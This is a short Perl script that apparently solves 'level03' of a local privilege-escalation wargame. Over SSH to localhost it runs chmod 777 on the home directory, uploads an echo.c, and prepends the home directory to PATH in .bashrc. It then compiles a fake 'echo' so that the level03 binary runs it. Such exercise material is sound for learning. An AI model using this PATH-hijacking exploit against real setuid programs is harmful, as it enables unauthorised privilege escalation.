#!/usr/bin/perl

$port = "22222";
$ip = "localhost";
$red = "\e[31m";
$green = "\e[32m";
$reset = "\e[0m";
$user = "level03";

$chmod = "chmod 777 .";
$ssh = "ssh -qp $port $user\@$ip '$chmod'";
print $red, $chmod, $reset, "\n";
system($ssh);

$scp = "scp -q -P $port ./echo.c $user\@$ip:~";
print $green, $scp, $reset, "\n";
system($scp);

$path = "PATH=~:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin";
$input = "echo $path > .bashrc && source .bashrc && gcc echo.c -o echo && ./level03";
print $red, $input, $reset, "\n";
system("ssh -qp $port $user\@$ip 'chmod 777 .bashrc && $input'");
